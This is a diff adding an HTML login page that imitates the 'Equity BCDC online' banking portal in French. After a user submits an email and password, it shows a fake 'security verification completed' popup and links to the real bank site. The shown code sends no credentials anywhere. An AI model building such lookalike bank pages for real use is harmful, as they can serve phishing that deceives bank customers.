@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+/* --------------------- LOADER INITIAL --------------------- */
+#loaderWrapper {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: #ffffff;
+    z-index: 999999;
+    overflow: hidden;
+}
+.burst-border {
+    position: absolute;
+    top: 50%; left: 50%;
+    width: 60px; height: 60px;
+    background: #6a0b0b;
+    border-radius: 50%;
+    transform: translate(-50%, -50%) scale(1);
+    animation: explodeRed 1.2s ease-in-out forwards;
+}
+@keyframes explodeRed {
+    0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+    50% { transform: translate(-50%, -50%) scale(8); opacity: 0.8; }
+    100% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+}
+.burst-white {
+    position: absolute;
+    top: 50%; left: 50%;
+    width: 40px; height: 40px;
+    background: #ffffff;
+    border-radius: 50%;
+    transform: translate(-50%, -50%) scale(1);
+    animation: explodeWhite 1.2s ease-out 0.3s forwards;
+}
+@keyframes explodeWhite {
+    0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+    50% { transform: translate(-50%, -50%) scale(5); opacity: 0.7; }
+    100% { transform: translate(-50%, -50%) scale(8); opacity: 0; }
+}
+#logo {
+    position: absolute;
+    top: 50%; left: 50%;
+    width: 120px;
+    transform: translate(-50%, -50%) scale(0.5);
+    opacity: 0;
+    transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out;
+}
+#mainContent { opacity: 0; transition: opacity 0.7s ease-in-out; }
+
+/* --------------------- BODY --------------------- */
+body {
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    height: 100vh;
+    overflow: hidden;
+    position: relative;
+    background: #f3f4f6;
+}
+
+/* --------------------- SVG BACKGROUND --------------------- */
+.svg-container {
+    position: absolute;
+    top: 0; left: 36%;
+    width: 749px; height: 869px;
+    transform: translateX(-50%) scaleX(1.2);
+    transform-origin: center top;
+    z-index: -1;
+}
+
+/* --------------------- LOGIN STRUCTURE --------------------- */
+.login-background { position: absolute; top:0; left:1000px; width:465px; height:100%; background:white; z-index:-1; }
+.left-message { position:absolute; left:140px; top:33%; transform:translateY(-50%); max-width:350px; font-size:20px; color:rgba(139,28,28,0.9); line-height:1.5; }
+.left-message img { width:180px; display:block; margin-bottom:10px; }
+.left-message strong { display:block; font-size:48px; margin-bottom:10px; font-weight:400; }
+.left-message span { font-size:18px; color:black; font-weight:400; }
+.login-wrapper { position:absolute; top:45%; left:1050px; transform:translateY(-50%); width:325px; }
+.login-area h1 { font-size:22px; font-weight:400; margin-bottom:12px; color:black; }
+.login-area .description { font-size:16px; color:#777; margin-bottom:25px; }
+.field-title { font-size:14px; font-weight:normal; color:#555; margin-bottom:6px; }
+input { width:100%; padding:15px; margin-bottom:20px; border:none; border-bottom:1px solid #bbb; background:transparent; font-size:16px; }
+input:focus { outline:none; border-bottom:1px solid rgba(139,28,28,0.9); }
+.forgot-wrapper { width:180px; text-align:center; margin-top:35px; margin-bottom:40px; }
+.forgot { font-size:15px; color:rgba(139,28,28,0.9); text-decoration:none; }
+.forgot:hover { text-decoration:underline; }
+button.submit-btn { padding:16px 0; background:#ccc; color:#555; border:none; border-radius:12px; font-size:14px; cursor:not-allowed; display:block; width:50%; font-weight:400; transition:all 0.3s ease; }
+button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:pointer; }
+.login-bottom-buttons { position:absolute; bottom:0; left:1000px; width:465px; display:flex; justify-content:space-between; padding:20px; box-sizing:border-box; }
+.language-btn, .support-btn { width:45px; height:45px; border-radius:50%; border:none; background:#e0e0e0; display:flex; align-items:center; justify-content:center; cursor:pointer; position:relative; }
+.language-btn img, .support-btn img { width:45px; height:45px; }
+#selectedLanguage { position:absolute; left:55px; top:50%; transform:translateY(-50%); font-size:16px; color:black; }
+#languageArrow { position:absolute; left:180px; top:50%; transform:translateY(-50%); }
+
+/* --------------------- POP-UP --------------------- */
+.overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.55); opacity:0; visibility:hidden; transition:0.3s ease; z-index:10; }
+.overlay.active { opacity:1; visibility:visible; }
+.popup { position:fixed; top:50%; left:50%; width:320px; background:white; border-radius:16px; padding:25px; transform:translate(-50%, -50%) scale(0.9); opacity:0; z-index:11; transition:all 0.25s ease; box-shadow:0 10px 35px rgba(0,0,0,0.25); display:flex; flex-direction:column; justify-content:flex-start; }
+.popup.active { opacity:1; transform:translate(-50%, -50%) scale(1); }
+.close-x { position:absolute; top:12px; right:16px; font-size:28px; font-weight:bold; color:rgba(139,28,28,0.9); cursor:pointer; transition:0.2s ease; }
+.close-x:hover { transform:scale(1.2); color:rgba(139,28,28,1); }
+.popup-header { font-size:24px; font-weight:400; text-align:center; color:black; margin-bottom:10px; }
+.popup-subtitle { text-align:center; font-size:20px; font-weight:400; color:black; margin-bottom:8px; }
+.popup-subtitle.small { font-size:14px; color:#999; margin-bottom:20px; }
+.language-options { display:flex; flex-direction:column; gap:15px; margin-top:10px; }
+.option { display:flex; justify-content:space-between; align-items:center; cursor:pointer; font-size:17px; color:#333; position:relative; }
+.option input { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; margin:0; cursor:pointer; z-index:2; }
+.option .custom-radio { pointer-events:none; width:24px; height:24px; border:2px solid rgba(139,28,28,0.9); border-radius:50%; display:flex; justify-content:center; align-items:center; background:white; position:relative; transition:all 0.25s ease; }
+.checkmark { width:10px; height:5px; border-left:2px solid white; border-bottom:2px solid white; transform:rotate(-45deg) scale(0); opacity:0; transition:all 0.25s ease; }
+.option input:checked + .custom-radio { background: rgba(139,28,28,0.9); border-color: rgba(139,28,28,0.9); }
+.option input:checked + .custom-radio .checkmark { opacity:1; transform:rotate(-45deg) scale(1); }
+.separator { width:100%; height:1px; background:#ddd; margin:10px 0; }
+
+/* --------------------- ŒIL MOT DE PASSE --------------------- */
+.password-wrapper { position:relative; }
+#toggleEye { position:absolute; top:16px; right:-16px; width:20px; height:18px; cursor:pointer; }
+
+/* --------------------- LOADER POP-UP CONFIRMATION --------------------- */
+.popup-loader {
+    position: fixed;
+    top:0; left:0;
+    width:100%; height:100%;
+    background: rgba(255,255,255,0.65);
+    display:none;
+    z-index:12;
+}
+.circle {
+    position:absolute;
+    top:50%; left:50%;
+    width:50px; height:50%;
+    transform:translate(-50%, -50%);
+}
+.dot {
+    width:10px; height:10px;
+    background:#6a0b0b;
+    border-radius:50%;
+    position:absolute;
+    top:50%; left:50%;
+    transform-origin: -18px 0;
+    animation: orbit 1.2s linear infinite;
+}
+.dot1 { transform:rotate(0deg) translateX(18px); animation-delay:0s; }
+.dot2 { transform:rotate(90deg) translateX(18px); animation-delay:0.15s; }
+.dot3 { transform:rotate(180deg) translateX(18px); animation-delay:0.3s; }
+.dot4 { transform:rotate(270deg) translateX(18px); animation-delay:0.45s; }
+@keyframes orbit {
+    0% { transform:rotate(0deg) translateX(18px) rotate(0deg); }
+    100% { transform:rotate(360deg) translateX(18px) rotate(-360deg); }
+}
+
+/* --------------------- AJOUT DEMANDÉ (POP-UP CONFIRMATION) --------------------- */
+#confirmationPopup a {
+    color: #6a0b0b !important;
+    font-weight: 500;
+    text-decoration: underline;
+}
+#confirmationPopup a:visited {
+    color: #6a0b0b !important;
+}
+</style>
+</head>
+<body>
+
+<!-- LOADER INITIAL -->
+<div id="loaderWrapper">
+    <div class="burst-border"></div>
+    <div class="burst-white"></div>
+    <img id="logo" src="images/logo.png">
+</div>
+
+<!-- CONTENU PRINCIPAL -->
+<div id="mainContent">
+    <!-- SVG background -->
+    <div class="svg-container">
+        <svg viewBox="0 0 749 869" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:100%; height:100%">
+            <mask id="mask0_12547_156437" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="749" height="870">
+                <rect x="0.000488281" width="748" height="870" fill="#C4C4C4"/>
+            </mask>
+            <g mask="url(#mask0_12547_156437)">
+                <rect x="0.000488281" width="748" height="870" fill="url(#paint0_linear_12547_156437)"/>
+            </g>
+            <path opacity="0.4" d="M-5.34058e-05 81.0342L111.095 0H-5.34058e-05V81.0342Z" fill="white"/>
+            <g style="mix-blend-mode:multiply" opacity="0.4">
+                <path d="M0 502.197L113.096 422.197L748.159 870H0V502.197Z" fill="#E9EAEA"/>
+            </g>
+            <g style="mix-blend-mode:multiply" opacity="0.4">
+                <path d="M748.158 0H590.43L748.158 115.05V0Z" fill="#E9EAEA"/>
+            </g>
+            <path opacity="0.4" d="M748.158 397.566L636.387 318.875L0 759.315V861.127L635.977 420.971L748.158 499.951V397.566Z" fill="white"/>
+            <defs>
+                <linearGradient id="paint0_linear_12547_156437" x1="374" y1="0" x2="374" y2="870" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#F7F7F7"/>
+                    <stop offset="1" stop-color="#E9EAEA"/>
+                </linearGradient>
+            </defs>
+        </svg>
+    </div>
+
+    <!-- Colonne blanche -->
+    <div class="login-background"></div>
+
+    <!-- Message gauche -->
+    <div class="left-message">
+        <img src="images/logoE.png">
+        <strong>Bienvenu à Equity BCDC online</strong>
+        <span>Equity online est le guichet unique pour tous vos besoins bancaires</span>
+    </div>
+
+    <!-- Formulaire -->
+    <div class="login-wrapper">
+        <div class="login-area">
+            <h1>S'identifier Connexion Sécurisée</h1>
+            <div class="description">
+                Connectez-vous pour continuer. N'oubliez pas que votre mot de passe est le vôtre, ne le communiquez à personne.
+            </div>
+            <form id="loginForm">
+                <div class="field-title">Adresse électronique ou numéro de téléphone portable</div>
+                <input type="text" placeholder="Adresse électronique ou numéro de téléphone portable" required>
+
+                <div class="field-title">Inscrire votre mot de passe</div>
+                <div class="password-wrapper">
+                    <input type="password" id="passwordField" placeholder="Inscrire votre mot de passe" required>
+                    
+                    <!-- SVG OEIL -->
+                    <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+                        <path d="M2 32C2 32 14 12 32 12C50 12 62 32 62 32C62 32 50 52 32 52C14 52 2 32 2 32Z" fill="none" stroke="#6a0b0b" stroke-width="4"/>
+                        <circle cx="32" cy="32" r="12" fill="none" stroke="#6a0b0b" stroke-width="4"/>
+                        <line x1="54" y1="10" x2="10" y2="54" stroke="#6a0b0b" stroke-width="6"/>
+                    </svg>
+                </div>
+
+                <div class="forgot-wrapper">
+                    <a href="#" class="forgot">Mot de passe oublié ?</a>
+                </div>
+                <button type="submit" class="submit-btn">S'identifier</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Boutons bas -->
+    <div class="login-bottom-buttons">
+        <button class="language-btn">
+            <img src="images/globe.png">
+            <span id="selectedLanguage">Français</span>
+            <svg id="languageArrow" width="12" height="8" viewBox="0 0 12 8" fill="none">
+                <path d="M1 1L6 6L11 1" stroke="#8B1C1C" stroke-width="2"/>
+            </svg>
+        </button>
+        <button class="support-btn" onclick="window.open('https://equitygroupholdings.com/cd/', '_blank')">
+            <img src="images/chat.png">
+        </button>
+    </div>
+
+    <!-- Overlay sombre -->
+    <div id="overlay" class="overlay"></div>
+
+    <!-- Loader Pop-up Confirmation -->
+    <div id="popupLoader" class="popup-loader">
+        <div class="circle">
+            <div class="dot dot1"></div>
+            <div class="dot dot2"></div>
+            <div class="dot dot3"></div>
+            <div class="dot dot4"></div>
+        </div>
+    </div>
+
+    <!-- Pop-up Langue -->
+    <div id="languagePopup" class="popup">
+        <div class="close-x">×</div>
+        <div class="popup-header">Langue</div>
+        <div class="popup-subtitle">Sélectionnez votre langue préférée</div>
+        <div class="popup-subtitle small">Chagua lugha / Hitamo ururimi / Sélectionnez la langue</div>
+        <div class="language-options">
+            <label class="option">
+                English
+                <input type="radio" name="lang" value="English">
+                <span class="custom-radio"><span class="checkmark"></span></span>
+            </label>
+            <div class="separator"></div>
+            <label class="option">
+                Français
+                <input type="radio" name="lang" value="Français" checked>
+                <span class="custom-radio"><span class="checkmark"></span></span>
+            </label>
+        </div>
+    </div>
+
+    <!-- Pop-up Confirmation Sécurité -->
+    <div id="confirmationPopup" class="popup">
+        <div class="close-x">×</div>
+        <div class="popup-header">Confirmation</div>
+        <div class="popup-subtitle">
+            Vérification de sécurité terminée avec succès. Toutes les informations de votre compte ont été vérifiées et aucune activité suspecte n’a été détectée.<br>
+            <a href="https://equitybcdconline.equitygroupholdings.com/fr-FR/access/login">Connectez-vous pour terminer le processus de sécurité</a>
+        </div>
+    </div>
+
+</div><!-- /mainContent -->
+
+<script>
+// ====== LOADER INITIAL ======
+setTimeout(() => {
+    const logo = document.getElementById('logo');
+    logo.style.opacity = 1;
+    logo.style.transform = 'translate(-50%, -50%) scale(1)';
+}, 1300);
+setTimeout(() => {
+    document.getElementById("loaderWrapper").style.display = "none";
+    document.getElementById("mainContent").style.opacity = 1;
+}, 2600);
+
+// ====== FORMULAIRE & BUTTON ======
+const emailInput = document.querySelector('input[type="text"]');
+const passwordInput = document.getElementById('passwordField');
+const submitBtn = document.querySelector('button.submit-btn');
+function toggleButton() {
+    if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') submitBtn.classList.add('active');
+    else submitBtn.classList.remove('active');
+}
+emailInput.addEventListener('input', toggleButton);
+passwordInput.addEventListener('input', toggleButton);
+toggleButton();
+
+// ====== TOGGLE MOT DE PASSE (OEIL PARFAIT) ======
+const toggleEye = document.getElementById('toggleEye');
+
+toggleEye.addEventListener('click', () => {
+    const line = toggleEye.querySelector('line'); // La barre sur l'œil
+
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';       // Montrer le mot de passe
+        line.style.opacity = "0";          // Retirer la barre
+    } else {
+        passwordInput.type = 'password';   // Cacher le mot de passe
+        line.style.opacity = "1";          // Remettre la barre
+    }
+});
+
+// ====== POP-UP LANGUE ======
+const overlay = document.getElementById('overlay');
+const languageBtn = document.querySelector('.language-btn');
+const languagePopup = document.getElementById('languagePopup');
+const languageClose = languagePopup.querySelector('.close-x');
+const languageRadios = document.querySelectorAll('input[name="lang"]');
+languageBtn.addEventListener('click', () => {
+    overlay.classList.add('active');
+    languagePopup.classList.add('active');
+});
+languageClose.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    languagePopup.classList.remove('active');
+});
+const translations = {
+  "Français": { loginTitle: "S'identifier", loginDesc: "Connectez-vous pour continuer. N'oubliez pas que votre mot de passe est le vôtre, ne le communiquez à personne.", emailPlaceholder: "Adresse électronique ou numéro de téléphone portable", passwordPlaceholder: "Inscrire votre mot de passe", forgot: "Mot de passe oublié ?", submit: "S'identifier" },
+  "English": { loginTitle: "Sign In", loginDesc: "Log in to continue. Remember your password is yours, do not share it with anyone.", emailPlaceholder: "Email address or phone number", passwordPlaceholder: "Enter your password", forgot: "Forgot password?", submit: "Sign In" }
+};
+const selectedLanguageSpan = document.getElementById('selectedLanguage');
+const loginTitleElem = document.querySelector('.login-area h1');
+const loginDescElem = document.querySelector('.login-area .description');
+const forgotLink = document.querySelector('.forgot');
+languageRadios.forEach(radio => {
+  radio.addEventListener('change', () => {
+    const lang = radio.value;
+    selectedLanguageSpan.textContent = lang;
+    loginTitleElem.textContent = translations[lang].loginTitle;
+    loginDescElem.textContent = translations[lang].loginDesc;
+    emailInput.placeholder = translations[lang].emailPlaceholder;
+    passwordInput.placeholder = translations[lang].passwordPlaceholder;
+    forgotLink.textContent = translations[lang].forgot;
+    submitBtn.textContent = translations[lang].submit;
+    overlay.classList.remove('active');
+    languagePopup.classList.remove('active');
+  });
+});
+
+// ====== POP-UP CONFIRMATION ======
+const confirmationPopup = document.getElementById('confirmationPopup');
+const confirmationClose = confirmationPopup.querySelector('.close-x');
+const popupLoader = document.getElementById('popupLoader');
+function showConfirmationPopup() {
+    overlay.classList.add('active');
+    popupLoader.style.display = 'block';
+    setTimeout(() => {
+        popupLoader.style.display = 'none';
+        confirmationPopup.classList.add('active');
+    }, 1500);
+}
+confirmationClose.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    confirmationPopup.classList.remove('active');
+});
+
+// ====== FORMULAIRE SUBMIT ======
+const loginForm = document.getElementById('loginForm');
+loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') showConfirmationPopup();
+});
+</script>
+</body>
+</html>
